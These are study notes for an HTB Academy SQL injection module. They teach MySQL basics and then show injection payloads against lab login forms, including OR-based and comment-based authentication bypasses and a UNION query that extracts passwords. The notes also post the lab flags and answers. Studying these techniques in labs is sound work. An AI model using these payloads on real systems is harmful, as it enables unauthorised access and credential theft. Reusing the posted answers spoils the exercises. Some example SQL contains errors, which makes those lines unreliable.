# HTB Academy Module SQL Injection
 


## SQL Injection Fundamentals


### Intro to MySQL

SQL syntax can differ from one RDBMS to another. However, they're all required to follow the ISO standard for Structured Query Language. We'll be following the MySQL/MariaDB syntax for the examples shown. SQL can be used to perform the following actions:
```
    Retrieve data
    Update data
    Delete data
    Create new tables and databases
    Add / remove users
    Assign permissions to these users
```
#### Command Line
To interact with MySQL database use mysql client with command 
```
$ mysql -u root -h <host ip/address> -P <Port no> -p
```
Where
 -u is use to give username
 -h flag is use give host name 
 -P is use to specify port number
 -p is use to give password #NOTE: if you specify -p empty so they prompt to enter password this is best choice

#### Creating a Database

Once you log in into mysql utility we can start using SQL queries to interact with DBMS there is many command to interact with it but some of them we disscuss here 
```
mysql> CREATE DATABASE users;
```
`CREATE DATABASE` is the query to crate database so there they crate database called users and to terminate te command with sami-colon(;) sign

Now we create the database so how we see it so to do that we use following query 
```
mysql> SHOW DATABASES;
```
`SHOW DATABASES` query is use to show all the database in dbms and sami-colon(;) to terminat the command

So now we show all the databases so how we interact or use any of the databases
```
mysql> USE users; 
```
`USE users` query is use to interact with any database 


#### Tables

As Relational database system store data in tables so we have to know how to create table in sql. But first we have to know the table is made up of horizontal rows and vertical columns and itersection of rows and columns is called cell.Every table is created with a fixed set of columns, where each column is of a particular data type.

the Datatype is define which type of value is stored in column some common example are numbers,strings,data,time and binary data etc . 

let create a table to create a table use query 
```
mysql> CREATE TABLE logins (id INT, usernmae VARCHAR(100), password VARCHAR(100), date_of_joining DATETIME,);
```
The above query create a table name logins with four columns the first one are id is an integar value the next one is username and password are set to strings of 100 characters each. Any input longer than that this will in an error, and last one are date_of_joining column of type DATETIME stores the date when an entry was added


So now we create a table so how we see all the table so to do this 
```
mysql> SHOW TABLES;
```
this will show all the tables in database

But how we see the content in tables so to do this 
```
mysql> DESCRIBE logins; 
```
this will show all the content in the table logins that we create priviously 
content involve with the Field name Type etc

#### Table Properties

When creating a table we can create many diffrent type of properties of columns like id column to auto increment so they increment itself when ever the item is added 

so some common keyword disscussed here to set the properties of the table

`id` `INT` `NOT` `NULL` `AUTO_INCREMENT`

the `id` is the column name `INT` is the integer type and `NOT NULL` specify this column can not be empty and `AUTO_INCREMENT` is specify auto increment is value
```
username VARCHAR(100) UNIQUE NOT NULL
```
the usernmae is the name of the column and `VARCHAR` is its datatype and `UNIQUE` is specify they must be unique no other table have same type of username and `NOT NULL` we is same we discribe above
```
date_of_joining DATETIME DEFAULT NOW()
```
The `date_of_joining` is the name of the table and `DATETIME` is its datatype and `DEFAULT NOW()` is use to set the column default value to `NOW()` which returns the current data and time
```    
PRIMARY KEY (id)
```
The PRIMARY KEY (id) is use to uniquely identify each record in the table,which can refer all data of a record within a table of relational databases

So now we know some common parameter so we use our previous example to create table 
```
myaql> CHREATE TABLE logins (
id INT NOT NULL AUTO_INCREMENT,
username VARCHAR(100) UNIQUE NOT NULL,
password VARCHAR(100) NOT NULL,
date_of_joining DATETIME DEFAULT NOW(),
PRIMARY KEY (id)
);
```
This will create the table with all common prameters we disscussed above

### HTB Question

Q: Connect to the database using the MySQL client from the command line. Use the 'show databases;' command to list databases in the DBMS. What is the name of the first database?

A: employees

use `show databases;` command to show all the databases


### SQL Statements

 What we learn above are how to use mysql utility and some common command so now on we learn what is sql statement 
 and how to use it

 ### INSERT Statement
 

 when we want to add new records to the table then we use insert statement

 **syntax**
 
```
 INSERT INTO table_name VALUES (column1_value, column2_value, column3_value, ...);
```
 Example
 
```
 mysql> INSERT INTO logins VALUES(1, 'admin', 'p@ssw0rd', '2020-07-02');
```
Above example show how can add new login to the login table  with appropriate values for each couumn.

whenever we want to insert values to specific table column so we use insert statement like this
 
 **syntax**
 
```
 INSERT INTO table_name(column2, column3, ...) VALUES (column2_value, column3_value, ...);
```
Note: skipping columns with the 'NOT NULL' constraint will result in an error, as it is a required value.
 
 Example
 
```
 mysql> INSERT INTO logins(username, password) VALUES('administrator','adm1n_p@ss');
```
In this example we add only username and password column in logins table with values administrator and adm1n_pass and skiping the id and date_of_joining column because they are automated 

Note: The examples insert cleartext passwords into the table, for demonstration only. This is a bad practice, as passwords should always be hashed/encrypted before storage.

 So when we want to add multiple record at the same time so we can do this by seprating it with comma

 Example
 
```
 mysql> INSERT INTO logins(username, password) VALUES ('john', 'john123'), ('tom', 'tom123');
```

In this example we add john and tom record at the same time 



 ### SELECT Statement
 

 So above we know how to add data in table using insert statement but how we retrieved them so to do that SELECT statement is use and many other purposes also.

 **Syntax**
 
```
 SELECT * FROM table_name;
```
here * is use as a wild card denote every thing in that table and FROM is a keyword that is use denote which table with use to retrived data.Its also possible to retrived data from certain columns as well 

 **Syntax**
 
```
 SELECT column1, column2 FROM table_name;
```
 the above syntax show only the content of the column1 and column2 data only but * show every thing in the data so that the difference

 ### DROP Statement
 
 So now we know how to add table but to remove tables we use drop statement

 Example
 
```
 mysql> DROP TABLE logins;
```
 Note DROP statement permanently remove the table


 ### ALTER Statement

 we can use this statement to change the name of the table and any of its field or to delete or add new column to an existing table.

 Example
 
```
 mysql> ALTER TABLE logins ADD newColumn INT;
 ```
this example show how to add new column in the table 
```
 mysql> ALTER TABLE logins RENAME COLUMN newcolumn TO   oldColumn;
```
this example show how to rename a column in table 

`NOTE we can also change the datatype of the column using MODIFY`
```
 mysql> ALTER TABLE logins MODIFY oldColumn DATE;
```
this will change the oldColumn datatype with DATE

 Finaly we can drop a column using DROP

 mysql> ALTER TABLE logins DROP oldColumn;

 We can use any of the above statements with any existing table, as long as we have enough privileges to do so.

### UPDATE Statement
 

 While `ALTER` is used to change a table's properties, the `UPDATE` statement can be used to update certain records within a table, based on certain conditions. It's general syntax is:
```
UPDATE table_name SET column1=newvalue1,column2=newvalue2,.... WHERE <condition>;
```
We specify the table name, each column and its new value, and the condition for which records will be updated. Let's look at an example:

```
mysql> UPDATE logins SET password = 'change_password'  WHERE id > 1 ;
```
this query change all the password in all recordes where id was greater then 1

Note: we have to specify the 'WHERE' clause with UPDATE, in order to specify which records get updated. The 'WHERE' clause will be discussed next.

# HTB Academy Question

Q: What is the department number for the 'Development' department?

A: d005

##### Solution:

To find the above answer use the following commands
```
mysql> SHOW DATABASES;
```
this will show you all the databases but for now we use employees database
```
mysql> USE employees;
```
to use the database
```
mysql> SHOW TABLES;
```
to show all the tables from the database
```
mysql> SELECT * FROM departments;
```
to retrive all the data from the deparment table

There you can see the all the deparment name with there number so there 'development' deparment exist with there number



### Query Results


In this section we learn how to control the results output of any query.


### Sorting Results


We can sort the results of any query using ORDER BY and spwcifying the column to sort by

Example

```
mysql> SELECT * FROM logins ORDER BY password;
```

NOTE: by default the sort is done in ascending order,but we can also sort the results by ASC or DESC.


Example

```
mysql> SELECT * FROM logins ORDER BY password DESC;
```
NOTE: It is also possible to sort by multiple columns, to have a secondary sort for duplicate values in one column

Example

```
mysql> SELECT * FROM logins ORDER BY password DESC, id ASC;

+----+---------------+-----------------+---------------------+
| id | username      | password        | date_of_joining     |
+----+---------------+-----------------+---------------------+
|  1 | admin         | p@ssw0rd        | 2020-07-02 00:00:00 |
|  2 | administrator | change_password | 2020-07-02 11:30:50 |
|  3 | john          | change_password | 2020-07-02 11:47:16 |
|  4 | tom           | change_password | 2020-07-02 11:50:20 |
+----+---------------+-----------------+---------------------+
4 rows in set (0.00 sec)
```
the result shows like this when you use this sort option as you can see they sort the column with the id section in acending order you can see it 

### LIMIT


 As when databases have to much records so when we search all the record with * then they take to much time so we can limit the records with the LIMIT Query so we can specify how much record we want to save our time

 Example
 -------
```
 mysql> SELECT * FROM logins LIMIT 2;

 ## this will shows only two upper records from logins table

 # NOTE: f we wanted to LIMIT results with an offset, we can specify the offset before the LIMIT count:

 mysql> SELECT * FROM logins LIMIT 1, 2;
 +----+---------------+------------+---------------------+
 | id | username      | password   | date_of_joining     |
 +----+---------------+------------+---------------------+
 |  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
 |  3 | john          | john123!   | 2020-07-02 11:47:16 |
 +----+---------------+------------+---------------------+
 2 rows in set (0.00 sec)
```

  this will shows the result with the offset with 1 meaning 2 and 3 show record 1 is ignored 

  Note: the offset marks the order of the first record to be included, starting from 0. For the above, it starts and includes the 2nd record, and returns two values.

 WHERE Clause
 ------------

 As we saw above how to sort or filter the result but when we want to filter or search for specifig result we use WHERE clause,to fine-tune the results

 Syntax
 
```
 SELECT * FROM table_name WHERE <condition>;
```
 this query will shows only those result that satisfy the condition

 Example
 -------
```
 mysql> SELECT * FROM logins WHERE id > 1;

 +----+---------------+------------+---------------------+
 | id | username      | password   | date_of_joining     |
 +----+---------------+------------+---------------------+
 |  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
 |  3 | john          | john123!   | 2020-07-02 11:47:16 |
 |  4 | tom           | tom123!    | 2020-07-02 11:47:16 |
 +----+---------------+------------+---------------------+
 3 rows in set (0.00 sec)
```
 As you can see all the result show that are satisfy the condition id > 1

 we can do that something with usernames or other condition also like 
```
 mysql> SELECT * FROM logins where username = 'admin';

 +----+----------+----------+---------------------+
 | id | username | password | date_of_joining     |
 +----+----------+----------+---------------------+
 |  1 | admin    | p@ssw0rd | 2020-07-02 00:00:00 |
 +----+----------+----------+---------------------+
 1 row in set (0.00 sec)
```

 The query above selects the record where the username is admin. We can use the UPDATE statement to update certain records that meet a specific condition.


 NOTE: String and date data types should be surrounded by single quote (') or double quotes ("), while numbers can be used directly.

LIKE Clause
-----------
 
 Above we search the record with specific data but when we don't know exact data so we can use like caluse that match the data with string we provide and show all the records that lie in that string 
 
 Example
 -------
```
 mysql> SELECT * FROM logins WHERE username LIKE 'admin%';

 +----+---------------+------------+---------------------+
 | id | username      | password   | date_of_joining     |
 +----+---------------+------------+---------------------+
 |  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
 |  4 | administrator | adm1n_p@ss | 2020-07-02 15:19:02 |
 +----+---------------+------------+---------------------+
 2 rows in set (0.00 sec)
```

this example shows that query will display all the record that matches the username admin and % act as a wildcard and matches all the characters after admin.its used to match zero or more characters.Similarly the _ symbol is used to match exactly one character.the below query matches all username with exactly three characters in them,whisch in this case was tom
```
 mysql> SELECT * FROM logins WHERE username like '___';

 +----+----------+----------+---------------------+
 | id | username | password | date_of_joining     |
 +----+----------+----------+---------------------+
 |  3 | tom      | tom123!  | 2020-07-02 15:18:56 |
 +----+----------+----------+---------------------+
 1 row in set (0.01 sec)
```

# HTB Academy Question

Q: What is the last name of the employee whose first name starts with "Bar" AND who was hired on 1990-01-01?

A: Mitchem 

##### Solution:

 Use the following commands and steps to get the above answer

step 1: first we have to find all the database so use 
```
mysql> SHOW DATABASES;
```
this will show us all the databases so as we search for employ so we look at the employees database to do that first we have to use that database using
```
mysql> USE employees;
```
this will select employees database. now we are in the data base so we have to find the tables as we don't know how many tables there so we use
```
mysql> SHOW TABLES;
```
this will show us all the tables so as again we search for employ so we look for the employees table.but first we have to note what we want so in the question they ask for the person last name and give us there name starting string and hiring date so let's dive in

step 2: we know the table name but we dont know the column name to search for the person so first we have to find the column name with
```
SELECT * FROM employess LIMIT 1 ;
```
this will shows us only one record there we see all the columns name that we use to apply filters

Now we know about every thing so we can search for the person with
```
SELECT * FROM employees WHERE first_name LIKE 'bar%' AND hire_date LIKE '1990-01-01';
```
This command search record in the column first_name with the condition first_name start with bar and hire_date column date is 1990-01-01

we find that record if we don't know about column names.

SQL Operators
=============

sometime we have to some use more then one command at the same time so to use that sql have Logical Operators to use multiple commands at the same time and the most common logical operators are AND,OR and NOT

AND Operator
------------

The AND operator takes in two condition and returns true or false based on their evaluation

Syntax
------
```
condition1 AND condition2
```

NOTE: the result of AND operator is true if and only if both conditions evaluate to true

Example
-------
```
mysql> SELECT 1 = 1 AND 'test' = 'test';

+---------------------------+
| 1 = 1 AND 'test' = 'test' |
+---------------------------+
|                         1 |
+---------------------------+
1 row in set (0.00 sec)
```
```
mysql> SELECT 1 = 1 AND 'test' = 'abc';

+--------------------------+
| 1 = 1 AND 'test' = 'abc' |
+--------------------------+
|                        0 |
+--------------------------+
1 row in set (0.00 sec)
```

In MySQL terms, any non-zero value is considered true, and it usually returns the value 1 to signify true. 0 is considered false. As we can see in the example above, the first query returned true as both the expressions evaluated to true. However, the second query returned false as the second condition 'test' = 'abc' is false.

OR Operator
-----------

The OR operator take two values also but they have some differences that they will return true value if one of the condition is true

Example
-------
```
mysql> SELECT 1 = 1 OR 'test' = 'abc';

+-------------------------+
| 1 = 1 OR 'test' = 'abc' |
+-------------------------+
|                       1 |
+-------------------------+
1 row in set (0.00 sec)
```
```
mysql> SELECT 1 = 2 OR 'test' = 'abc';

+-------------------------+
| 1 = 2 OR 'test' = 'abc' |
+-------------------------+
|                       0 |
+-------------------------+
1 row in set (0.00 sec)
```

The queries above demonstrate how the OR operator works. The first query evaluated to true as the condition 1 = 1 is true. The second query has two false conditions, resulting in false output.


NOT Operator
------------

This operator also take two values but they reverse the boolean like if answer is true they turned him false or vice versa

Example
-------
```
mysql> SELECT NOT 1 = 1;

+-----------+
| NOT 1 = 1 |
+-----------+
|         0 |
+-----------+
1 row in set (0.00 sec)
```
```
mysql> SELECT NOT 1 = 2;

+-----------+
| NOT 1 = 2 |
+-----------+
|         1 |
+-----------+
1 row in set (0.00 sec)
```

As seen in the examples above, the first query resulted in false, because it is the inverse of the evaluation of 1 = 1, which is true, so its inverse is false. The second was query returned true, as the inverse of 1 = 2 'which is false' is true.


Symbol Operator
---------------

The AND,OR and NOT operator we use above can be represented by the symbols as well like && for AND,|| for OR and ! for NOT respectivly.

Example
-------
```
mysql> SELECT 1 = 1 && 'test' = 'abc';

+-------------------------+
| 1 = 1 && 'test' = 'abc' |
+-------------------------+
|                       0 |
+-------------------------+
1 row in set, 1 warning (0.00 sec)
```
```
mysql> SELECT 1 = 1 || 'test' = 'abc';

+-------------------------+
| 1 = 1 || 'test' = 'abc' |
+-------------------------+
|                       1 |
+-------------------------+
1 row in set, 1 warning (0.00 sec)
```
```
mysql> SELECT 1 != 1;

+--------+
| 1 != 1 |
+--------+
|      0 |
+--------+
1 row in set (0.00 sec)
```

Operators in queries
--------------------

As we now know the common operators so now we use that operators in sql queries to search results

Example
-------
```
mysql> SELECT * FROM logins WHERE username != 'john';
+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
|  4 | tom           | tom123!    | 2020-07-02 11:47:16 |
+----+---------------+------------+---------------------+
3 rows in set (0.00 sec)
```
the query search for username in username column but username is not equal to john so our result have all the username that are not equal to john

Example
-------
```
mysql> SELECT * FROM logins WHERE username != 'john' AND id > 1;

+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
|  4 | tom           | tom123!    | 2020-07-02 11:47:16 |
+----+---------------+------------+---------------------+
2 rows in set (0.00 sec)
```

Now the above query search for all user whose id column have greater value then 1 but there username not equal to john so the show us result with user that name is not john and there id is greater then 1

Multiple Operator Precedence
----------------------------

SQL supports various other operations such as addition, division as well as bitwise operations. A query could have multiple expressions with multiple operations at once. The order of these operations is decided through operator precedence.
Here is a list of common operations and their precedence, as seen in the MariaDB Documentation:


  *  Division (/), Multiplication (*), and Modulus (%)

  *  Addition (+) and Subtraction (-)

  *  Comparison (=, >, <, <=, >=, !=, LIKE)

  *  NOT (!)

  *  AND (&&)

  *  OR (||)

Operations at the top are evaluated before the ones at the bottom of the list. Let's look at an example
```
SELECT * FROM logins WHERE username != 'tom' AND id > 3 - 2;
```
The query has 4 different operations in it, i.e. !=, AND, >, and -. From the operator precedence, we know that subtraction comes first, so it will first evaluate 3 - 2 to 1 so now sql query is like this
```
SELECT * FROM logins WHERE username != 'tom' AND id > 1;
```
Next, we have two comparison operations, > and !=. Both of these are of the same precedence and will be evaluated together. So, it will return all records where username is not tom, and all records where the id is greater than 1, and then apply AND to return all records with both of these conditions

Example
-------
```
mysql> select * from logins where username != 'tom' AND id > 3 - 2;

+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  2 | administrator | adm1n_p@ss | 2020-07-03 12:03:53 |
|  3 | john          | john123!   | 2020-07-03 12:03:57 |
+----+---------------+------------+---------------------+
2 rows in set (0.00 sec)
```
# HTB Academy Question

Q: In the 'titles' table, what is the number of records WHERE the employee number is greater than 200000 OR their title does NOT contain 'engineer'?

A:366957 

##### Solution:
use the following steps to get the answer

Step 1

First find the database where they are located so use every databases and check where it exits so do that use the following commands
```
SHOW DATABASES;
```
to show all the databases
```
USE <DATABASE NAME>;
```
to use database 
```
SHOW TABLES;
```
to show all the tables in the database 

from now on you found the titles table tiltes if not use the othere databases and find the titles table.so now use
the following commanand to get the answer above 
```
select count(*) from titles where emp_no > 200000 OR title NOT LIKE '%engineer%';
```
let break how the command works 

1. `SELECT count(*) from titles`: this will select every column in the table and count the every number of rows(records) of the results

2. `where emp_no > 200000 or title NOT LIKE '%engineer%';`

where is the keyword use to control the query result more detail found in Result Query section above and emp_no and title are column name in the table you have to know it first when you control the query result to make the condition for the results to found out this use the following query
```
DESCRIBE titles;
```
this will show all the column name and its datatype

now come back to the query again `emp_no > 200000 OR title NOT LIKE '%engineer%'` is the condition that question give us to find the answer question say title not contain engineer so if you fillter only this there is some record that have name sinor engineer and assissted engineer so we have to fillter it also so that why we use `NOT LIKE '%engineer%'` as `%` is use as a wild card that will represent every thing before and after as well 

Intro to SQL Injections
=======================

now we how sql work so let dive in the sql injection 


Use of SQL in Web Application
-----------------------------

Today many web application use databases for dynamic web site for storing users data or other things also so they integrate the database funtionality with backend programming language like php etc

PHP Code:
```
$conn = new mysqli("localhost", "root", "password", "users");
$query = "select * from logins";
$result = $conn->query($query);
```

this code is use to connect mysql database to our php web application

the query's output will be stored in $result, and we can print it to the page or use it in any other way. The below PHP code will print all returned results of the SQL query in new lines

PHP Code:
```
while($row = $result->fetch_assoc() ){
    echo $row["name"]."<br>";
}
```

Web applications also usually use user-input when retrieving data. For example, when a user uses the search function to search for other users, their search input is passed to the web application, which uses the input to search within the databases

PHP Code:
```
$searchInput =  $_POST['findUser'];
$query = "select * from logins where username like '%$searchInput'";
$result = $conn->query($query);
```
If we use user-input within an SQL query, and if not securely coded, it may cause a variety of issues, like SQL Injection vulnerabilities.

What is an Injection
---------------------

So injection is that when user suplied input is process without sanitization so a maliciouse user use this to break the programming sequence execute its own code  called injection.so attactker use sql charectors to break the sql query and suplied there own sql queiry to retrived data so this is called sql injection.

the above example we use that accept users input with out sanitization

SQL Injection
-------------

An SQL injection occurs when user-input is inputted into the SQL query string without properly sanitizing or filtering the input. The previous example showed how user-input can be used within an SQL query, and it did not use any form of input sanitization

PHP Code:
```
$searchInput =  $_POST['findUser'];
$query = "select * from logins where username like '%$searchInput'";
$result = $conn->query($query);
```
In normal cases, the searchInput would be inputted to complete the query, and it would return the expected outcome. Any input we type goes into the following SQL query:

PHP Code:
```
'%$searchInput'
```

So, if we input admin, it becomes '%admin'. In this case, if we write any SQL code, it would just be considered as a search term. For example, if we input SHOW DATABASES;, it would be executed as '%SHOW DATABASES;' The web application will search for usernames similar to SHOW DATABASES;. However, as there is no sanitization, in this case, we can add a single quote ('), which will end the user-input field, and after it, we can write actual SQL code. For example, if we search for 1'; DROP TABLE users;, the search input would be:

PHP code:
```
'%1'; DROP TABLE users;'
``` 

Notice how we added a single quote (') after "1", in order to escape the bounds of the user-input in ('%$searchInput').


So, the final SQL query executed would be as follows:

SQL Code:
```
select * from logins where username like '%1'; DROP TABLE users;'
```

As we can see from the syntax highlighting, we are actually able to escape the original query's bounds and have our newly injected query execute as well. Once the query is run, the users table will get deleted.

NOTE: In the above example, for the sake of simplicity, we added another SQL query after a semi-colon (;). Though this is actually not possible with MySQL, it is possible with MSSQL and PostgreSQL. In the coming sections, we'll discuss the real methods of injecting SQL queries in MySQL.

Syntax Error 
------------

The previous example of SQL injection would, in fact, return an error:

PHP Code:
```
Error: near line 1: near "'": syntax error
```                                     
Can you guess why? This is because of the last trailing character, where we have an extra single quote (') that is not closed, which causes a SQL syntax error when executed

SQL Code:
---------
```
select * from logins where username like '%1'; DROP TABLE users;'
```

In this case, we had only one trailing character, as our input from the search query was near the end of the SQL query. However, the user-input usually goes in the middle of the SQL query, and the rest of the original SQL query comes after it.

To have a successful injection, we have to ensure that the newly modified SQL query is still valid and does not have any syntax errors after our injection. In most cases, we would not have access to the source code to find the original SQL query and develop a proper SQL injection to make a valid SQL query. So, how would we be able to successfully inject into the SQL query then?

One answer is by using comments, and we will discuss this in a later section. Another is to make the query syntax work by passing in multiple single quotes, as we will discuss next (').

Now that we have a good understanding of SQL injections' basics let's start learning some practical uses of SQL injections.

Types of SQL Injections
-----------------------

SQL Injections are categorized based on how and where we retrieve their output.
```
                     SQL Injections
                     --------------
                             |
                             |
----------------------------------------------------------                     
|                           |                      |                      
In-band                    Blind               out of band 
   |                         |
   |                         |
----------------             |
|           |            ----------------
-----     -------        |              |
Union       Error     --------       ------
Based       Based      Boolean        Time
                       Based          Based
```

In-Band
-------

When both the intended and the new query may be printed directly on the front end,and we directly read it this is called In-Band SQL injection and they have two types 

1. Union Based 
2. Error Based

Union Based
-----------

In union based sql injection,we specify the exact location, i.e., column' in which we want to read,so query will direct the output to be printed there.

Error Based
-----------

In Error Based sql injection we tempered with PHP or SQL error that show us on front end,and so we may intentionally cause an SQL that returns the output of our query

Blind
-----

In complicated cases we may not get the output printed al all,so we may utilize SQL logic to retrived the output character by character this is called blind sql injection.They also have two types

1. Boolean Based
2. Time Based

Boolean Based
-------------

Boolean Based sql injection occurs when we can use SQL conditional statements to control whether the page returns any output at all, 'i.e. Original query response,'if our conditional statement returns true.

Time Based
----------

Time based SQL injection occurs when we use SQL conditional statements that delay the page response if the conditional statement returns true using the Sleep() function.

Out-of-band
-----------

This sql injection occurs when we have no dirct access to the output so we direct the output to a remote location,'i.e.,DNS record,'and then attempt to retrieve it from there this is known as Out-of-band SQL injection.

# there we will focusing only on Union Based sql injection

Subverting Query Logic
======================

Now that we have a basic idea about how SQL statements work let's get started with SQL injection. Before we start executing full SQL queries, we will first learn how to modify the original query by injecting the OR operator and using SQL comments to subvert the original query's logic. A basic example of this is bypassing web authentication, which we will demonstrate in this section.

Authentication Bypass
---------------------

consider any login panal that required username and password to login to the account.

When we have proper authentication credential like username is admin and password is letmein so suppose backend query is like this 

SELECT * logins WHERE username='admin' AND password = 'letmein';

so our goal is to login as a admin with out giving him credentials

the above query do match username and password if both are correct so then they shows us admin panal if not they give us any error msg

SQLi Discovery
--------------

Before we start trying to subvert the web application's logic and attempt to bypass the authentication, we first have to test whether the login form is vulnerable to SQL injection. To do that, we will try to add one of the below payloads after our username and see if it causes any errors or changes how the page behaves
```
Payload   |    URL Encoded
==========================
  '       |        %27
          |
  "       |        %22
          |
  #       |        %23
          |
  ;       |        %3B
          |
  )       |        %29
=========================
```


Note: In some cases, we may have to use the URL encoded version of the payload. An example of this is when we put our payload directly in the URL 'i.e. HTTP GET request'.


if the output shows error msg like Error: You have an error in you SQL syntax:check the manual that corresponds to you MySQL server version for the right syntax to use near 'something" at line 1

this is because sql query become like this 

SELECT * FROM logins WHERE username=''' AND password = 'something';



The quote we entered resulted in an odd number of quotes, causing a syntax error, as discussed in the previous section. One option would be to comment out the rest of the query and write the remainder of the query as part of our injection to form a working query. Another option is to use an even number of quotes within our injected query, such that the final query would still work.

OR Injection
------------

To bypass the authentication, we would need the query to always return true, regardless of the username and password entered. To do this, we can abuse the OR operator in our SQL injection.

As previously discussed, the MySQL documentation for operation precedence states that the AND operator would be evaluated before the OR operator. This means that if there’s at least one TRUE condition in the entire query along with an OR operator, the entire query will evaluate to TRUE, since the OR operator returns TRUE if one of its operands is TRUE.

An example of a condition that will always return true is `'1'='1'`. To keep the SQL query working and keep an even number of quotes, instead of using ('1'='1'), we will remove the last quote and use ('1'='1), so the remaining single quote from the original query would be in its place.

So, if we inject the below condition and have an OR operator between it and the original condition, it should always return true
```
admin' or '1'='1
```
The final query should be as follow:
```
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
```

This means the following:
```
    If username is admin
    OR
    If 1=1 return true 'which always returns true'
    AND
    If password is something
```


Since the OR operator will be evaluated first, if any of the first two queries return true, the entire query should return true. Since 1=1 always returns true, this query will return true, and it will grant us access.

Auth Bypass with OR operator
----------------------------

so now we know things work here so now we use this payload to authentication bypass so we have to do is fill username section with admin or '1=1' and fill password section with anything

we are able to login as a admin because username is correct and other check become true because of or operator so we are login as a admin account with out giving proper credentials

this thing work in password section as well like fill username section with the above parameters and fill the password section with like anything or '1=1' this will also use to login as a admin


# HTB Academy Question

Q: Try to log in as the user 'tom'. What is the flag value shown after you successfully log in?

A: 202a1d1a8b195d5e9a57e434cc16000c

You have to do just to place the following payload to the username string 
```
tom' or '1'='1
```
although you can enter password with any random string or you can leave it empity also.but can login as a tom user and there you can find that flag also

Using Comments
==============

In this section we use comments to perform sql injection attacks for subvert the logic of backend server

Comments
--------
Just like other language SQL allows the use of comments as well. comments are used to document queries or ignore a certain part of the query.

we use two types of comments with MySQL `--` and `#`

the `--` can be used as follows
```
mysql> SELECT username FROM logins;
```
Selects usernames from the logins table 

Note: In SQL, using two dashes only is not enough to start a comment. So, there has to be an empty space after them, so the comment starts with (-- ), with a space at the end. This is sometimes URL encoded as (--+), as spaces in URLs are encoded as (+). To make it clear, we will add another (-) at at the end (-- -), to show the use of a space character.

The `#` symbol can be used as well.
```
mysql> SELECT * FROM logins WHERE username = 'admin'; # You can place anything here AND password = 'something'
```
Tip: if you are inputting your payload in the URL within a browser, a (#) symbol is usually considered as a tag, and will not be passed as part of the URL. In order to use (#) as a comment within a browser, we can use '%23', which is an HTTP encoded (#) symbol.

The part of the query with AND password = 'something' will be ignored by the server during evaluation.

Auth Bypass with comments
-------------------------

Let's go back to our previous example and inject admin'-- as our username. The final query will be
```
SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
```
As we can see from the syntax highlighting, the username is now admin, and the remainder of the query is now ignored as a comment. Also, this way, we can ensure that the query does not have any syntax issues.

Let's try using these on the login page, and log in with the username admin'-- and anything as the password

now the query become 
```
SELECT * FROM logins WHERE username='admin'-- ' AND password = 'a';
```
As we see, we were able to bypass the authentication, as the new modified query checks for the username, with no other conditions.

Another Example
---------------

SQL supports the usage of parenthesis if the application needs to check for particular conditions before others. Expressions within the parenthesis take precedence over other operators and are evaluated first. Let's look at a scenario like 
```
SELECT * FROM logins WHERE (username='admin' AND id > 1) AND password = '415b550bf45bf454safd45547821f'
```

The above query ensures that the user's id is always greater than 1, which will prevent anyone from logging in as admin. Additionally, we also see that the password was hashed before being used in the query. This will prevent us from injecting through the password field due to the input being changed to a hash.

so when we try to login as admin with username and password we cannot login as a admin but when we try to login as other user we can login successfully 

Logging in as the user with an id not equal to 1 was successful. So, how can we log in as the admin? From the previous section on comments, we know that we can use them to comment out the rest of the query. Let’s try using admin'-- as the username.

so query become like this 
```
SELECT * FROM logins WHERE (usrname='admin'--' AND id > 1) AND password = '4d5sfa456f4asd56f456g4a6t4e654'
```
when the the query become like this this shows us an error

paranthesis_error

The login failed due to a syntax error, as the open parenthesis wasn’t balanced by a closed one. To execute the query successfully, we’ll have to add a closing parenthesis. Let’s try using the username admin')-- to close and comment out the rest.
```
SELECT * FROM logins WHERE (usrname='admin')--' AND id > 1) AND password = '4d5sfa456f4asd56f456g4a6t4e654'
```
now we can login successfully

# HTB Academy Question

Q: Login as the user with the id 5 to get the flag.

A: cdad9ecdf6f14b45ff5c4de32909caec
#### Solution:

to login with the `id > 5` we  have to use `OR` operator in our SQL query to successfully login like this
```
1' OR id = 5) -- -
```
so we use `1'` to close the username bracket and after that we use `OR` operator to match the condition `id = 5` 
as this will match so our condition become true because of OR operator and ) to close our bracker and after that we use -- - to comment everything after it so they don't execute other conditions and we successfully login as a superadmin

Union Clause
============

From above we use only sql injection with the same query that backend system use with OR operator and comments so now on we use other type of SQL injection which called SQLi Union Injection.

Union
-----

The Union clause is used to combine results from multiple SELECT statements. This means that through a UNION injection, we will be able to SELECT and dump data from all across the DBMS, from multiple tables and databases. 

Example
-------

let suppose we have a database and we select every thing in ports table so we use the following condition
```
mysql> SELECT * FROM ports;
```
this will show all the content of ports table so now see the content of ships table so we use the following query
```
mysql> SELECT * FROM ships;
```
so we seprativily use this condition to see the content of the tables so to ignore this we use UNION clause to use one condion that show the content of both of the tables at the same time like the following query 
```
mysql> SELECT * FROM ports UNION SELECT * FROM ships;
```
this will show all the result of ports table and the ships tables at the same output.

NOTE: The data types of the selected columns on all positions should be the same.

Even Columns
------------

A UNION statement can only operate on SELECT statements with an equal number of columns. For example, if we attempt to UNION two queries that have results with a different number of columns, we get the following error:
```
mysql> SELECT city FROM ports UNION SELECT * FROM ships;
```
```
ERROR 1222 (21000): The used SELECT statements have a different number of columns
```

The above query results in an error, as the first SELECT returns two columns and the second SELECT returns one. Once we have two queries that return the same number of columns, we can use the UNION operator to extract data from other tables and databases.

or example, if the query is:
```
SELECT * FROM products WHERE product_id = 'user_input'
```
We can inject a UNION query into the input, such that rows from another table are returned:
```
SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '
```
The above query would return username and password entries from the passwords table, assuming the products table has two columns.

Un-even Columns
---------------

We will find out that the original query will usually not have the same number of columns as the SQL query we want to execute, so we will have to work around that. If we only had one column we want to SELECT, we can put junk data for the remaining required columns so that the total number of columns we are UNIONing with remains the same as the original query.

